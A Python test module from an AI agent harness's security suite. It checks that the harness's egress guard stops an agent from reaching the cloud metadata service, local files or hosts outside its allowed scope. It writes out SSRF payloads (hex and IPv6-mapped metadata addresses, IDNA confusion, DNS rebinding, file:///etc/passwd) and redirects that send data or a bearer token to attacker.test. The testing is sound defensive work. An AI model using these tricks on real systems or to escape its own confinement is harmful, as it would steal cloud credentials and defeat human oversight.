"""Attacks on where the harness will send a request.

The broker runs in the *unsandboxed* parent, so an outbound request the agent
asks for is made from a process that can reach the host's own network. Two
separate claims are under attack here:

- **SSRF.** No matter how the agent spells it, the harness will not fetch the
  cloud metadata service or a non-http(s) URL.
- **Host scope.** A session confined to a set of sites stays confined —
  including when a site it *is* allowed to talk to tries to bounce it elsewhere.
"""

from __future__ import annotations

import contextlib
import ipaddress
import socket

from ..scoreboard import Attack, Verdict
from ..support import (
    METADATA_IP,
    PUBLIC_IP,
    FakeResponse,
    fake_httpx,
    judge,
    must,
    real_resolver,
    refused_with,
    resolver,
    scratch,
)


def _http(root, allowed_hosts=None):
    from pyharness.broker.capabilities import HttpSessionCapability
    from pyharness.core.workspace import Workspace
    from pyharness.security.egress import normalize_scope_hosts

    return HttpSessionCapability(
        Workspace(root),
        allowed_hosts=(
            normalize_scope_hosts(allowed_hosts) if allowed_hosts is not None else None
        ),
    )


def _fetch(url: str, *, allowed_hosts=None) -> None:
    with scratch("egress") as root, fake_httpx():
        _http(root, allowed_hosts).request(None, "GET", url)


def _reaches_a_normal_site() -> None:
    """Shared control: the same call shape, against an ordinary public site,
    goes all the way to the transport. Proves the capability is wired and the
    fixture is live, so a refusal elsewhere is the guard's doing."""
    with scratch("egress-control") as root, resolver() as _, fake_httpx() as client:
        _http(root).request(None, "GET", "https://example.com/report")
        must(
            client.urls() == ["https://example.com/report"],
            "the control request never reached the transport — the exploit path "
            "is not live, so nothing this attack reports is meaningful",
        )


# ---------------------------------------------------------------------------


def _metadata_by_ip() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    with resolver():
        return refused_with(
            lambda: _fetch(f"http://{METADATA_IP}/latest/meta-data/iam/"),
            EgressBlocked,
            "blocked address",
        )


def _metadata_by_name() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    with resolver({"metadata.google.internal": METADATA_IP}):
        return refused_with(
            lambda: _fetch("http://metadata.google.internal/computeMetadata/v1/"),
            EgressBlocked,
            "blocked address",
        )


def _metadata_by_name_control() -> None:
    """The name really does point at the metadata service in this scenario —
    otherwise the refusal would be about an unresolvable host, not about where
    the host resolves to."""
    with resolver({"metadata.google.internal": METADATA_IP}):
        from pyharness.security import egress

        addresses = [
            info[4][0] for info in egress._resolve_host("metadata.google.internal")
        ]
        must(
            addresses == [METADATA_IP],
            f"the scenario's resolver does not point the name at the metadata "
            f"service (got {addresses}) — the attack is inert",
        )


def _metadata_obfuscated() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    # 0xa9fea9fe == 169.254.169.254. The platform resolver, not the harness,
    # expands this — which is exactly why a string-matching blocklist would miss
    # it and a resolve-then-classify guard does not.
    with real_resolver():
        return refused_with(
            lambda: _fetch("http://0xa9fea9fe/latest/meta-data/"),
            EgressBlocked,
            "blocked address",
        )


def _metadata_obfuscated_control() -> None:
    """This spelling really is the metadata address on this platform. Where the
    C library refuses to expand it the attack is inert, and the suite must say
    so rather than bank a free BLOCKED."""
    infos = socket.getaddrinfo("0xa9fea9fe", None, proto=socket.IPPROTO_TCP)
    must(
        {info[4][0] for info in infos} == {METADATA_IP},
        "this platform's resolver does not expand the hexadecimal spelling to "
        f"{METADATA_IP}; the obfuscation attack cannot run here",
    )


def _metadata_ipv6_mapped() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    with resolver():
        return refused_with(
            lambda: _fetch(f"http://[::ffff:{METADATA_IP}]/latest/meta-data/"),
            EgressBlocked,
            "blocked address",
        )


def _metadata_ipv6_mapped_control() -> None:
    """The IPv4-mapped form denotes the same endpoint.

    This is the attack a security review reported as *working* — "verified
    locally" — and it does not. The control is here because that claim was the
    most confidently written one in the report, and the difference between a
    real finding and a plausible one is whether anybody ran it.
    """
    mapped = ipaddress.ip_address(f"::ffff:{METADATA_IP}")
    must(
        mapped.ipv4_mapped == ipaddress.ip_address(METADATA_IP),
        "the mapped form does not denote the metadata address; attack is inert",
    )


def _non_http_scheme() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    return refused_with(
        lambda: _fetch("file:///etc/passwd"), EgressBlocked, "only http/https"
    )


# --- the gap between vetting a host and connecting to it ---------------------
#
# Both attacks below live in that gap. The guard clears a *name*; the socket is
# opened to an *address*. Anything that can make those two disagree — a second
# DNS lookup, or a second interpretation of the same hostname — reaches a host
# nobody vetted.

# A host whose two IDNA encodings are different names. CPython's resolver
# applies IDNA 2003 and maps the sharp s to "ss"; httpx (and every browser)
# applies IDNA 2008 and produces the xn-- form.
_IDNA_HOST = "faß.example.com"
_IDNA_2003 = "fass.example.com"
_IDNA_2008 = "xn--fa-hia.example.com"


def _idna_confusion() -> Verdict:
    """Spell the target so the guard and the client read different hostnames out
    of it: the one the guard resolves is a harmless public site, the one the
    client connects to is the metadata service."""
    from pyharness.security.egress import EgressBlocked

    with resolver({_IDNA_2003: PUBLIC_IP, _IDNA_2008: METADATA_IP}):
        return refused_with(
            lambda: _fetch(f"http://{_IDNA_HOST}/latest/meta-data/"),
            EgressBlocked,
            "blocked address",
        )


def _idna_confusion_control() -> None:
    """The two spellings really are different names, and the one the *client*
    would use really is the dangerous one. Without this the attack could pass on
    a platform where both encodings agree, where it proves nothing."""
    import httpx

    must(
        _IDNA_HOST.encode("idna").decode() == _IDNA_2003,
        "this platform's resolver does not map the name to the IDNA 2003 form; "
        "there is no divergence here for the attack to exploit",
    )
    must(
        httpx.URL(f"http://{_IDNA_HOST}/").raw_host.decode() == _IDNA_2008,
        "the HTTP client does not encode the name to the IDNA 2008 form; the "
        "attack is not describing this client's behaviour",
    )


class _RecordingTransport:
    """Stands in for the socket layer: records the request the harness actually
    handed to the network instead of sending it."""

    def __init__(self):
        self.requests: list = []

    def handle_request(self, request):
        import httpx

        self.requests.append(request)
        return httpx.Response(200, request=request)

    def close(self) -> None:
        pass

    def hosts(self) -> list[str]:
        return [request.url.host for request in self.requests]


@contextlib.contextmanager
def _rebinding_scenario():
    """A resolver that answers honestly once and rebinds to the metadata service
    on every lookup after, plus the transport that records where the harness
    actually ended up."""
    import httpx

    from pyharness.security import egress

    answers = iter([PUBLIC_IP])

    def _rebind(host: str):
        address = next(answers, METADATA_IP)
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, 0))]

    original = egress._resolve_host
    egress._resolve_host = _rebind
    recorder = _RecordingTransport()
    client = httpx.Client(transport=egress.PinnedTransport(inner=recorder))
    try:
        yield client, recorder
    finally:
        client.close()
        egress._resolve_host = original


def _dns_rebinding() -> Verdict:
    """Answer the guard's lookup with a public address and the connection's
    lookup with the metadata service — the classic TOCTOU on a name-based
    egress check."""
    with _rebinding_scenario() as (client, recorder):
        client.get("http://rebind.test/latest/meta-data/iam/")
        return judge(
            attacker_won=METADATA_IP in recorder.hosts(),
            ran=len(recorder.requests) == 1,
            ran_evidence=(
                f"the request never reached the transport ({recorder.hosts()}), so "
                "where it would have connected is unknown"
            ),
        )


def _rebinding_control() -> None:
    """The rebinding resolver is live and would in fact hand the metadata address
    to a second lookup. Without this the attack scores a free BLOCKED against a
    resolver that never rebinds."""
    from pyharness.security import egress

    with _rebinding_scenario() as (client, recorder):
        client.get("http://rebind.test/one")
        second = [info[4][0] for info in egress._resolve_host("rebind.test")]
        must(
            second == [METADATA_IP],
            f"the scenario's resolver does not rebind on the second lookup (got "
            f"{second}) — there is no TOCTOU here to defend against",
        )
        must(
            recorder.hosts() == [PUBLIC_IP],
            f"the request did not go to the first, vetted answer either (got "
            f"{recorder.hosts()}) — the attack cannot tell pinning from a "
            "transport that never connects",
        )


# ---------------------------------------------------------------------------
# Host scope
# ---------------------------------------------------------------------------

SCOPE = ["example.com"]


def _in_scope_still_works() -> None:
    """Shared control for the scope attacks: a site the session *is* confined to
    (and a subdomain of it) still goes through. Without this, a scope that
    refused everything would score four free wins."""
    with scratch("scope-control") as root, resolver() as _, fake_httpx() as client:
        cap = _http(root, SCOPE)
        cap.request(None, "GET", "https://example.com/a")
        cap.request(None, "GET", "https://api.example.com/b")
        must(
            len(client.urls()) == 2,
            f"the in-scope control requests did not reach the transport "
            f"({client.urls()}) — the scope is refusing everything, so refusing "
            "the attack proves nothing",
        )


def _lookalike_domain() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    with resolver():
        return refused_with(
            lambda: _fetch("https://evil-example.com/collect", allowed_hosts=SCOPE),
            EgressBlocked,
            "outside this session's allowed hosts",
        )


def _ip_literal_sidestep() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    with resolver():
        return refused_with(
            lambda: _fetch(f"https://{PUBLIC_IP}/collect", allowed_hosts=SCOPE),
            EgressBlocked,
            "outside this session's allowed hosts",
        )


def _redirect_out_of_scope() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    def responder(method, url, kwargs):
        if url == "https://example.com/start":
            return FakeResponse(
                status=302, url=url, redirect_to="https://attacker.test/collect"
            )
        return FakeResponse(url=url)

    with resolver(), fake_httpx(responder), scratch("redirect") as root:
        return refused_with(
            lambda: _http(root, SCOPE).request(
                None, "GET", "https://example.com/start"
            ),
            EgressBlocked,
            "outside this session's allowed hosts",
        )


def _redirect_is_actually_followed() -> None:
    """The redirect machinery is live: an in-scope hop *is* chased, so the
    out-of-scope refusal is the scope check firing per hop, not the harness
    quietly declining to follow redirects at all."""

    def responder(method, url, kwargs):
        if url == "https://example.com/start":
            return FakeResponse(
                status=302, url=url, redirect_to="https://api.example.com/end"
            )
        return FakeResponse(url=url)

    with resolver(), fake_httpx(responder) as client, scratch("redirect-ctl") as root:
        result = _http(root, SCOPE).request(None, "GET", "https://example.com/start")
        must(
            "https://api.example.com/end" in client.urls(),
            f"the in-scope redirect was not followed ({client.urls()}); the "
            "per-hop check cannot be what stopped the out-of-scope one",
        )
        must(result["status"] == 200, "the followed hop did not resolve to a response")


def _redirect_to_metadata() -> Verdict:
    from pyharness.security.egress import EgressBlocked

    def responder(method, url, kwargs):
        if url == "https://example.com/start":
            return FakeResponse(
                status=302,
                url=url,
                redirect_to=f"http://{METADATA_IP}/latest/meta-data/",
            )
        return FakeResponse(url=url)

    # Unscoped session: nothing but the SSRF guard stands between the redirect
    # and the metadata service.
    with resolver(), fake_httpx(responder), scratch("redirect-ssrf") as root:
        return refused_with(
            lambda: _http(root).request(None, "GET", "https://example.com/start"),
            EgressBlocked,
            "blocked address",
        )


def _uncredentialed_redirect_is_followed() -> None:
    """Control for the credential-replay attack: strip the credential and the
    *identical* redirect to the attacker is chased all the way. So the harness
    plainly would have gone there; carrying a credential is the only thing that
    stopped it."""

    def responder(method, url, kwargs):
        if url == "https://example.com/api":
            return FakeResponse(
                status=302, url=url, redirect_to="https://attacker.test/collect"
            )
        return FakeResponse(url=url)

    with resolver(), fake_httpx(responder) as client, scratch("redir-ctl") as root:
        _http(root).request(None, "GET", "https://example.com/api")
        must(
            "https://attacker.test/collect" in client.urls(),
            f"the uncredentialed redirect was not followed either ({client.urls()}) "
            "— this attack cannot distinguish credential handling from a harness "
            "that never follows redirects",
        )


def _credentialed_request_follows_redirect() -> Verdict:
    """The exfil this defends: a site answers an authenticated request with a
    redirect to the attacker, and the credential is replayed on the next hop."""
    from pyharness.security.vault import Vault

    secret = "S3CR3T-bearer-token"

    def responder(method, url, kwargs):
        if url == "https://example.com/api":
            return FakeResponse(
                status=302, url=url, redirect_to="https://attacker.test/collect"
            )
        return FakeResponse(url=url)

    with resolver(), fake_httpx(responder) as client, scratch("redir-secret") as root:
        from pyharness.broker.capabilities import HttpSessionCapability
        from pyharness.core.workspace import Workspace

        cap = HttpSessionCapability(Workspace(root), vault=Vault({"tok": secret}))
        result = cap.request(None, "GET", "https://example.com/api", auth="tok")
        wire = client.wire_text()
        return judge(
            attacker_won="attacker.test" in " ".join(client.urls()),
            ran=secret in wire and result["status"] == 302,
            ran_evidence=(
                "the credential was never attached to the first hop, or the site "
                f"did not answer with a redirect (status={result['status']})"
            ),
        )


ATTACKS = [
    Attack(
        id="ssrf-metadata-by-ip",
        surface="egress",
        description="fetch the cloud metadata endpoint directly by its address",
        property=(
            "The agent cannot make the harness read the cloud instance metadata "
            "service, which would hand it the machine's cloud credentials."
        ),
        run=_metadata_by_ip,
        control=_reaches_a_normal_site,
    ),
    Attack(
        id="ssrf-metadata-by-name",
        surface="egress",
        description="fetch a hostname that resolves to the metadata endpoint",
        property=(
            "Internal targets are refused by where they lead, not by how they are "
            "spelled: a perfectly ordinary-looking hostname that points at the "
            "metadata service is refused too."
        ),
        run=_metadata_by_name,
        control=_metadata_by_name_control,
    ),
    Attack(
        id="ssrf-metadata-obfuscated",
        surface="egress",
        description="reach the metadata endpoint via its hexadecimal spelling",
        property=(
            "Rewriting a forbidden address in an equivalent numeric form does not "
            "make it reachable."
        ),
        run=_metadata_obfuscated,
        control=_metadata_obfuscated_control,
    ),
    Attack(
        id="ssrf-metadata-ipv6-mapped",
        surface="egress",
        description="reach the metadata endpoint via its IPv4-mapped IPv6 form",
        property=(
            "An address written in a different address family's notation is the "
            "same address, and is refused the same way."
        ),
        run=_metadata_ipv6_mapped,
        control=_metadata_ipv6_mapped_control,
    ),
    Attack(
        id="ssrf-idna-confusion",
        surface="egress",
        description="spell a host so the guard and the client read different names",
        property=(
            "A host is vetted as the exact name the connection will use. A "
            "spelling that two pieces of software disagree about cannot get one "
            "host approved and a different one contacted."
        ),
        run=_idna_confusion,
        control=_idna_confusion_control,
    ),
    Attack(
        id="ssrf-dns-rebinding",
        surface="egress",
        description="rebind the hostname to the metadata endpoint after the check",
        property=(
            "The harness talks to the address it approved. Changing where a name "
            "points, in the moment between the check and the connection, does not "
            "change where the request goes."
        ),
        run=_dns_rebinding,
        control=_rebinding_control,
    ),
    Attack(
        id="egress-non-http-scheme",
        surface="egress",
        description="use the fetch surface to read a local file (file://)",
        property=(
            "The fetch surface reads the web. It is not a second, ungated way to "
            "read the host's disk or to speak protocols nobody approved."
        ),
        run=_non_http_scheme,
        control=_reaches_a_normal_site,
    ),
    Attack(
        id="scope-lookalike-domain",
        surface="egress",
        description="reach evil-example.com from a session confined to example.com",
        property=(
            "A session confined to a set of sites cannot be talked into reaching a "
            "look-alike domain that merely ends with the same letters."
        ),
        run=_lookalike_domain,
        control=_in_scope_still_works,
    ),
    Attack(
        id="scope-ip-literal",
        surface="egress",
        description="address a host by IP to sidestep a hostname allowlist",
        property=(
            "Naming a machine by its address instead of its name does not put it "
            "inside a list of allowed names."
        ),
        run=_ip_literal_sidestep,
        control=_in_scope_still_works,
    ),
    Attack(
        id="scope-redirect-escape",
        surface="egress",
        description="an in-scope site redirects a confined session off-scope",
        property=(
            "A site cannot carry a confined session out of its confinement by "
            "answering with a redirect."
        ),
        run=_redirect_out_of_scope,
        control=_redirect_is_actually_followed,
    ),
    Attack(
        id="ssrf-redirect-to-metadata",
        surface="egress",
        description="a public site redirects the fetch to the metadata endpoint",
        property=(
            "Approving a request to a site does not approve wherever that site "
            "chooses to send the harness next."
        ),
        run=_redirect_to_metadata,
        control=_redirect_is_actually_followed,
    ),
    Attack(
        id="credential-replayed-on-redirect",
        surface="egress",
        description="redirect an authenticated request so the token is resent",
        property=(
            "A credential is delivered only to the destination the human saw. A "
            "site cannot obtain it for a third party by redirecting."
        ),
        run=_credentialed_request_follows_redirect,
        control=_uncredentialed_redirect_is_followed,
    ),
]
